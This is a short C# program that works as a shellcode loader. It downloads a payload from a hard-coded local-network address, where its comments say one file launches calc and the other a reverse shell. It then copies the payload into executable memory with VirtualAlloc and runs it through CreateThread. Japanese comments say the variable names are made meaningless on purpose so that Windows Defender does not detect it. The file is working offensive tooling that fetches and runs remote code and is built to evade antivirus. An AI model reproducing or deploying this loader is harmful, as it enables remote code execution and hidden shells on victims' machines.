using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program { 
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  /*
   * 以降あえて変数名を適当にしている。
   * 適当にしないと、Windows Defenderに検知される。
   */

  private static UInt32 HOGE = 0x1000;
  private static UInt32 MOGE = 0x40;

  public static void Main()
  {
      /*
       * ペイロードを指定
       * a.html : calc
       * b.html : reverse shell
       */
      string hoge = "http://192.168.1.102:8000/b.html";
      Moge(hoge);
  }
  
  public static void Moge(string hoge)
  {
      WebClient wc = new WebClient();

      byte[] foo = wc.DownloadData(hoge);
      Console.WriteLine(foo.Length);
      Console.WriteLine(foo);
      
      UInt32 bar = VirtualAlloc(0, (UInt32)foo.Length, HOGE, MOGE);
      Marshal.Copy(foo, 0, (IntPtr)(bar), foo.Length);
      
      IntPtr threadHandle = IntPtr.Zero;
      UInt32 threadId = 0;
      IntPtr parameter = IntPtr.Zero;
      threadHandle = CreateThread(0, 0, bar, parameter, 0, ref threadId);

      WaitForSingleObject(threadHandle, 0xFFFFFFFF);
  }

}
